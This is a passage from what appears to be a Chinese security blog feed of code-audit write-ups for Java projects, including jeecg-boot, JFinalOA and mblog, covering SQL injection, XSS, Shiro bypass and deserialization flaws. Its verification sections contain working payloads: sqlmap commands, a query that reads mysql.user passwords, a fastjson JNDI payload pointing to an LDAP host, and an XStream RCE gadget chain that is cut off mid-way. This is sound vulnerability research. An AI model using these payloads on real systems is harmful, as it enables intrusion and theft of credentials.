bash">sqlmap.py -r D:\test.txt<br>sqlmap.py -r D:\test.txt --random-agent --dbs --current-db<br></code></pre></div></td></tr></table></figure><p><img src="/images/44/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>oasys漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JFinalOA前台SQL注入</title>
    <link href="/2020/12/14/43/"/>
    <url>/2020/12/14/43/</url>
    
    <content type="html"><![CDATA[<p><a href="https://gitee.com/glorylion/JFinalOA">https://gitee.com/glorylion/JFinalOA</a></p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/pointlion/mvc/admin/oa/workflow/flowtask/FlowTaskController.java 123行<br></code></pre></div></td></tr></table></figure><p>定义字符串请求参数<code>defkey</code></p><p><img src="/images/43/1.png"></p><p>随后调用<code>getHavedonePage</code>方法把前端传来的参数进行处理，结果封装到<code>Page&lt;Record&gt;</code>，查看<code>wfservice</code>是从哪里定义的接口</p><p><img src="/images/43/2.png"></p><p>跟进<code>WorkFlowService</code>，在该service层中搜索前面调用到的<code>getHavedonePage</code>方法，在该方法中含有一条没有进行预编译sql查询，此处直接进行数据查询导致了漏洞的产生</p><p><img src="/images/43/3.png"></p><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>路由配置文件路径</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/pointlion/config/routes/OARoutes.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/43/4.png"></p><p>在前面<code>FlowTaskController</code>的<code>getHaveDoneTaskDataList</code>方法中含有一个越权漏洞，此处只获取了登陆状态，没有对用户鉴权</p><p><img src="/images/43/5.png"></p><p>获取登陆用户信息封装到cookie里</p><p><img src="/images/43/6.png"></p><p>所以这个注入只需要普通用户就可以利用，这里创建一个test用户</p><p><img src="/images/43/7.png"></p><p>根据该框架路由配置结合controller的方法构造url</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/admin/oa/workflow/flowtask/getHaveDoneTaskDataList?pageNumber=&amp;pageSize=&amp;defkey=<br></code></pre></div></td></tr></table></figure><p>注入payload</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; UNION SELECT 1,2,3 --+</span><br></code></pre></div></td></tr></table></figure><p><img src="/images/43/8.png"></p><p>语句报错，丢sqlmap注入</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap.py -r D:\test.txt --random-agent<br></code></pre></div></td></tr></table></figure><p><img src="/images/43/9.png"></p><p>跑库</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap.py -r D:\test.txt --random-agent --dbs --current-db<br></code></pre></div></td></tr></table></figure><p><img src="/images/43/10.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>Jfinal漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某Struts框架平台sql注入记录</title>
    <link href="/2020/12/04/42/"/>
    <url>/2020/12/04/42/</url>
    
    <content type="html"><![CDATA[<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">\src\com\asiainfo\newBam\action\systemmanage\UserManagerAction.java 35行<br></code></pre></div></td></tr></table></figure><p>在<code>searchUserByLoginName</code>方法中定义了字符串参数loginName，然后转到<code>userService</code>的<code>searchUserByLoginName</code>方法处理loginName</p><p><img src="/images/42/1.png"></p><p>跟进<code>userService</code></p><p><img src="/images/42/2.png"></p><p>定义接口，继续跟进<code>IUserManagerService</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">\src\com\asiainfo\newBam\service\sysManager\IUserManagerService.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/42/3.png"></p><p>还是接口定义，在该接口里没有对<code>searchUserByLoginName</code>方法做具体实现，全局搜索<code>implements IUserManagerService</code>查看其实现类</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">\src\com\asiainfo\newBam\service\sysManager\impl\UserManagerServiceImpl.java<br></code></pre></div></td></tr></table></figure><p>查看<code>searchUserByLoginName</code>方法</p><p><img src="/images/42/4.png"></p><p>跟进查看<code>userDao</code></p><p><img src="/images/42/5.png"></p><p>全局搜索<code>implements IUserManagerDAO</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">\src\com\asiainfo\newBam\dao\sysManager\impl\UserManagerDAOImpl.java<br></code></pre></div></td></tr></table></figure><p>查看<code>searchUserByLoginName</code>方法</p><p><img src="/images/42/6.png"></p><p>参数拼接，然后把sql语句直接带入数据库查询,注入产生</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jeecg boot快速开发平台2.4SQL注入</title>
    <link href="/2020/12/03/41/"/>
    <url>/2020/12/03/41/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/zhangdaiscott/jeecg-boot">https://github.com/zhangdaiscott/jeecg-boot</a></p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/org/jeecg/modules/api/controller/SystemAPIController.java 167行<br></code></pre></div></td></tr></table></figure><p>根据注释发现这里是一处查询，且<code>table</code>、<code>text</code>、<code>code</code>参数可控，这里把table、text、code传入<code>queryTableDictItemsByCode</code>进行进一步的参数处理</p><p><img src="/images/41/1.png"></p><p>跟进看看哪里定义了<code>sysBaseAPI</code></p><p><img src="/images/41/2.png"></p><p>接口定义，继续跟进<code>ISysBaseAPI</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/org/jeecg/common/system/api/ISysBaseAPI.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/41/3.png"></p><p>这里为接口，往下看<code>queryTableDictItemsByCode</code>方法为空实现，所以全局搜索<code>implements ISysBaseAPI</code>查看其实现类</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/org/jeecg/modules/system/service/impl/SysBaseApiImpl.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/41/4.png"></p><p>在此处搜索刚刚<code>SystemAPIController</code>调用到的里的<code>queryTableDictItemsByCode</code>方法，也就是这里</p><p><img src="/images/41/5.png"></p><p>搜索结果</p><p><img src="/images/41/6.png"></p><p>寻找参数是否包含有<code>#&#123;</code>，然后转到<code>getSqlRuleValue</code>处理table</p><p><img src="/images/41/7.png"></p><p>此处不算针对注入做的安全措施，所以回到<code>SysBaseApiImpl</code>里继续跟进查看哪里定义了<code>sysDictService</code></p><p><img src="/images/41/8.png"><br><img src="/images/41/9.png"></p><p>跟进<code>ISysDictService</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/org/jeecg/modules/system/service/ISysDictService.java<br></code></pre></div></td></tr></table></figure><p>是一个接口</p><p><img src="/images/41/10.png"></p><p>全局搜索<code>implements ISysDictService</code>查看其实现类</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/org/jeecg/modules/system/service/impl/SysDictServiceImpl.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/41/11.png"></p><p>在该实现类里搜索<code>SysBaseApiImpl</code>调用的<code>queryTableDictItemsByCode</code>方法，也就是这里</p><p><img src="/images/41/12.png"></p><p>搜索结果</p><p><img src="/images/41/13.png"></p><p>在这里把前台的table，text，code参数传入mapper进行数据查询，跟进<code>sysDictMapper.xml</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/org/jeecg/modules/system/mapper/xml/SysDictMapper.xml<br></code></pre></div></td></tr></table></figure><p>搜索<code>queryTableDictItemsByCode</code>，发现传入的参数使用了<code>$&#123;&#125;</code>直接进行查询，导致了注入的产生</p><p><img src="/images/41/14.png"></p><h1 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h1><p>注册一个普通用户<br>根据controller的路由构造url为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">http://localhost/sys/api/queryTableDictItemsByCode?table= &amp;text= &amp;code=<br></code></pre></div></td></tr></table></figure><p>根据mysql的特征查系统默认数据库</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">http://localhost/sys/api/queryTableDictItemsByCode?table=mysql.user&amp;text=User&amp;code=password<br></code></pre></div></td></tr></table></figure><p><img src="/images/41/15.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MTV-漏洞复现/验证专用框架</title>
    <link href="/2020/12/02/38/"/>
    <url>/2020/12/02/38/</url>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>推荐使用jdk&lt;=1.8.0_181</p><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>启动框架查看效果<br><img src="/images/38/1.png"><br>测试fastjson反序列化漏洞<br><img src="/images/38/2.png"></p><p>可以自定义添加其他漏洞环境<br>项目地址：<a href="https://github.com/novysodope/mytestvul">https://github.com/novysodope/mytestvul</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于原生反序列化readObject的审计</title>
    <link href="/2020/11/30/40/"/>
    <url>/2020/11/30/40/</url>
    
    <content type="html"><![CDATA[<p>序列化及反序列化演示</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>: novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span>: 2020/11/30</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@time</span>: 15:29</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">package</span> org.javaboy.scheduling02.service;<br><span class="hljs-keyword">import</span> org.javaboy.scheduling02.service.Testa;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.*;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Teststudy</span> </span>&#123;<br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br><span class="hljs-comment">//序列化</span><br><span class="hljs-comment">// 创建一个文件流，将对象MyObject写进文件</span><br>                MyObject myObject=<span class="hljs-keyword">new</span> MyObject();<br>                myObject.name=<span class="hljs-string">&quot;hello&quot;</span>;<span class="hljs-comment">//定义成员变量，能让序列化结果更直观展示</span><br>                FileOutputStream fos=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;D:\\tools\\桌面\\待完成漏洞审计\\java\\a.txt&quot;</span>);<br>                ObjectOutputStream os=<span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>                os.writeObject(myObject);<br>                os.close();<br><span class="hljs-comment">//反序列化</span><br><span class="hljs-comment">// 获取文件内容，根据内容还原对象</span><br>                FileInputStream fis=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;D:\\tools\\桌面\\待完成漏洞审计\\java\\a.txt&quot;</span>);<br>                ObjectInputStream ois=<span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>                MyObject obj2=(MyObject)ois.readObject();<br>                System.out.print(obj2);<br>                ois.close();<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//只有实现了Serializable接口的类才可以被序列化</span><br>        <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span>&#123;<br>        in.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125;&#125;<br><br><br><br></code></pre></div></td></tr></table></figure><p>这就是反序列化操作的过程，在输出结果中我们就可以很直观的看到其序列化的内容和反序列化后还原的类<br><img src="/images/40/1.png"></p><p>web实例</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deserialize</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>       ServletInputStream inputStream = request.getInputStream(); <span class="hljs-comment">//获取请求体</span><br>       ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>       objectInputStream.readObject();<br>       objectInputStream.close();<br>   &#125;<br></code></pre></div></td></tr></table></figure><p><img src="/images/40/2.png"></p><p>参考链接<br><a href="https://www.freebuf.com/column/155381.html" title="Java反序列化漏洞从无到有">Java反序列化漏洞从无到有</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>反序列化漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某大型框架登陆存储型XSS</title>
    <link href="/2020/11/26/39/"/>
    <url>/2020/11/26/39/</url>
    
    <content type="html"><![CDATA[<p>漏洞验证：<br>登陆的时候用户名插入xss payload</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;img src=<span class="hljs-number">1</span> onerror=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></div></td></tr></table></figure><p><img src="/images/39/1.png"><br>后台会记录登陆日志，当查看登陆日志时就会触发xss<br><img src="/images/39/2.png"></p><p>代码分析：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">src/main/java/com/pig4cloud/pig/admin/controller/LogController.java <span class="hljs-number">53</span>行<br></code></pre></div></td></tr></table></figure><p>日志查询，查看<code>sysLogService</code>在哪里被定义<br><img src="/images/39/3.png"><br>跟进<code>SysLogService</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">src/main/java/com/pig4cloud/pig/admin/service/SysLogService.java<br></code></pre></div></td></tr></table></figure><p>在此接口中无具体实现，所以全局搜索其实现类<br><img src="/images/39/4.png"><br>在实现里搜索调用到的<code>getLogByPage</code>方法</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">src/main/java/com/pig4cloud/pig/admin/service/impl/SysLogServiceImpl.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/39/5.png"><br>经过查询后直接返回结果集，漏洞产生</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某数据分析平台fastjson反序列化</title>
    <link href="/2020/11/21/37/"/>
    <url>/2020/11/21/37/</url>
    
    <content type="html"><![CDATA[<h1 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h1><p>src/main/java/org/xxxxx/controller/CommonsController.java 49行<br>这里用了一个@RequestBody注解，获取整个请求体进行反序列化<br><img src="/images/37/1.png"><br>查看Fastjson版本：<br><img src="/images/37/2.png"></p><h1 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h1><p>因为没有演示环境而且这个社区版启动会报错，所以直接仿此处写个小靶场<br>创建一个springmvc web项目，pom中引入组件<br><img src="/images/37/3.png"><br>新建利用类<br><img src="/images/37/4.png"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/test&quot;)</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">persist</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String dataStr)</span> </span>&#123;<br>       JSONObject data = JSONObject.parseObject(dataStr);<br>       <span class="hljs-keyword">return</span> dataStr;<br>   &#125;<br></code></pre></div></td></tr></table></figure><p>Payload：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;name&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.83.11:1389/o=tomcat&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<span class="hljs-string">&quot;;</span><br></code></pre></div></td></tr></table></figure><p>发送请求<br><img src="/images/37/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastjson反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mblog4.0存储型XSS+权限绕过</title>
    <link href="/2020/11/20/36/"/>
    <url>/2020/11/20/36/</url>
    
    <content type="html"><![CDATA[<p>mblog4.0：<a href="https://github.com/langhsu/mblog" title="下载地址">下载地址</a><br><img src="/images/36/1.png"></p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p>不分析了</p><h1 id="shiro权限绕过"><a href="#shiro权限绕过" class="headerlink" title="shiro权限绕过"></a>shiro权限绕过</h1><p>引用了1.4.0版本的shiro<br><img src="/images/36/3.png"><br>在该版本的shiro中有一个权限绕过的漏洞，查看过滤配置</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/mtons/mblog/config/ShiroConfiguration.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/36/4.png"><br>根据过滤规则进行绕过即可，比如密码重置，正常没登陆访问是这样的：<br><img src="/images/36/5.png"><br>在/pwd后加一个/即可绕过进行未授权密码重置<br><img src="/images/36/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shiro权限绕过</tag>
      
      <tag>存储型XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>若依后台管理框架3.2.1逻辑缺陷+未授权访问漏洞+上传漏洞</title>
    <link href="/2020/11/19/35/"/>
    <url>/2020/11/19/35/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA代码审计</tag>
      
      <tag>druid未授权访问</tag>
      
      <tag>信息泄露</tag>
      
      <tag>ruoyicms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-26217 XStream RCE复现</title>
    <link href="/2020/11/17/34/"/>
    <url>/2020/11/17/34/</url>
    
    <content type="html"><![CDATA[<h1 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h1><p>jdk1.8.0_231<br><img src="/images/34/1.png"></p><h1 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h1><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;map&gt;<br>  &lt;entry&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString&gt;<br>      &lt;flags&gt;0&lt;/flags&gt;<br>      &lt;value <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;<br>        &lt;dataHandler&gt;<br>          &lt;dataSource <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;<br>            &lt;contentType&gt;text/plain&lt;/contentType&gt;<br>            &lt;is <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;<br>              &lt;e <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;<br>                &lt;iterator <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;<br>                  &lt;iter <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;<br>                    &lt;cursor&gt;0&lt;/cursor&gt;<br>                    &lt;lastRet&gt;-1&lt;/lastRet&gt;<br>                    &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;<br>                    &lt;outer-<span class="hljs-class"><span class="hljs-keyword">class</span>&gt;</span><br><span class="hljs-class">                      &lt;<span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">ProcessBuilder</span>&gt;</span><br><span class="hljs-class">                        &lt;<span class="hljs-title">command</span>&gt;</span><br><span class="hljs-class">                          &lt;<span class="hljs-title">string</span>&gt;<span class="hljs-title">calc</span>&lt;/<span class="hljs-title">string</span>&gt;</span><br><span class="hljs-class">                        &lt;/<span class="hljs-title">command</span>&gt;</span><br><span class="hljs-class">                      &lt;/<span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">ProcessBuilder</span>&gt;</span><br><span class="hljs-class">                    &lt;/<span class="hljs-title">outer</span>-<span class="hljs-title">class</span>&gt;</span><br><span class="hljs-class">                  &lt;/<span class="hljs-title">iter</span>&gt;</span><br><span class="hljs-class">                  &lt;<span class="hljs-title">filter</span> <span class="hljs-title">class</span></span>=<span class="hljs-string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;<br>                    &lt;method&gt;<br>                      &lt;<span class="hljs-class"><span class="hljs-keyword">class</span>&gt;<span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">ProcessBuilder</span>&lt;/<span class="hljs-title">class</span>&gt;</span><br><span class="hljs-class">                      &lt;<span class="hljs-title">name</span>&gt;<span class="hljs-title">start</span>&lt;/<span class="hljs-title">name</span>&gt;</span><br><span class="hljs-class">                      &lt;<span class="hljs-title">parameter</span>-<span class="hljs-title">types</span>/&gt;</span><br><span class="hljs-class">                    &lt;/<span class="hljs-title">method</span>&gt;</span><br><span class="hljs-class">                    &lt;<span class="hljs-title">name</span>&gt;<span class="hljs-title">start</span>&lt;/<span class="hljs-title">name</span>&gt;</span><br><span class="hljs-class">                  &lt;/<span class="hljs-title">filter</span>&gt;</span><br><span class="hljs-class">                  &lt;<span class="hljs-title">next</span>/&gt;</span><br><span class="hljs-class">                &lt;/<span class="hljs-title">iterator</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">type</span>&gt;<span class="hljs-title">KEYS</span>&lt;/<span class="hljs-title">type</span>&gt;</span><br><span class="hljs-class">              &lt;/<span class="hljs-title">e</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">in</span> <span class="hljs-title">class</span></span>=<span 